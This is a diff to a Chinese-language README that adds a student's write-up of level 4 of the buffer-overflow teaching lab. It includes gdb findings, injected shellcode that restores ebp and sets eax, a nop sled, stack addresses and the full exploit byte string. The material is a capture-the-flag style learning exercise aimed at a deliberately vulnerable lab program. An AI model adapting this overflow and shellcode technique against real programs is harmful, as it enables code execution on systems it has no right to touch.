@@ -167,6 +167,55 @@ d8 37 68 55
 ## Level 4: Nitroglycerin (10 pts)
 
 题目要求与level_3一致，不过比起level_3难度上升了一些
-使用-n参数使程序调用testn和getbufn函数，
+使用-n参数使程序调用testn和getbufn函数，需要将level_3中的要求执行5次，并且ebp的值在一定区间内随机
+使用gdb测算本题的溢出偏移为524
 
+![avatar](https://github.com/AmaIIl/buffer-lab/blob/gh-pages/image6.png)
+
+因为ebp在一定区间内随机，也就意味着无法像上题那样直接赋值了，不过可以观察函数反汇编代码
+
+![avatar](https://github.com/AmaIIl/buffer-lab/blob/gh-pages/image7.png)
+
+因为testn和getbufn是caller和callee的关系，也就是说当getbufn执行完毕后esp指向的是testn的栈顶
+观察反汇编代码不难看出，esp+0x28处的值即为我们所需要的ebp的值，编写如下汇编指令
+```
+00000000 <.text>:
+   0:	b8 b8 da 18 28       	mov    $0x2818dab8,%eax
+   5:	8d 6c 24 28          	lea    0x28(%esp),%ebp
+   9:	68 3a 8e 04 08       	push   $0x8048e3a
+   e:	c3                   	ret    
+```
+然后便是writeup提示中让我们使用的 "nop sled",因为ebp的随机化使得我覆盖eip的值也处于随机化的状态，这时使用nop sled在其可能的范围内填充上一大串的nop，犹如做雪橇一般一路滑倒我们所指定的返回地址处，上面算得本题的偏移是524，汇编代码占15位，也就是说再生成'90'x(524-15)位的nop即可
+再来就是返回地址的问题了，观察getbufn的反汇编代码
+```
+   0x0804920c <+0>:	push   ebp
+   0x0804920d <+1>:	mov    ebp,esp
+   0x0804920f <+3>:	sub    esp,0x218
+   0x08049215 <+9>:	lea    eax,[ebp-0x208]
+   0x0804921b <+15>:	mov    DWORD PTR [esp],eax
+   0x0804921e <+18>:	call   0x8048cfa <Gets>
+   0x08049223 <+23>:	mov    eax,0x1
+   0x08049228 <+28>:	leave  
+   0x08049229 <+29>:	ret    
+```
+可以看到我们所需要的地址就在[ebp-0x208]处，通过gdb调试后得到如下地址
+```
+0x55683648
+0x556835b8
+0x556835a8
+```
+因为栈是高地址向低地址生长，这边选择最高地址0x55683648作为跳转地址，然后就可以构建本题的exp了
+```
+'90'x(524-15)
+b8 b8 da 18 
+28 8d 6c 24 
+28 68 3a 8e 
+04 08 c3 
+a0 36 68 55
+```
+
+![avatar](https://github.com/AmaIIl/buffer-lab/blob/gh-pages/image8.png)
+
+### 小结
+这周空闲的时间多了一些，做了两个lab。因为都是跟栈溢出有关的东西原来有些都了解过所以整体体验良好。原先的计划是一个月摸到shell lab，可现在看来还差4个lab才能摸到，菜鸡还需要继续努力啊。
 
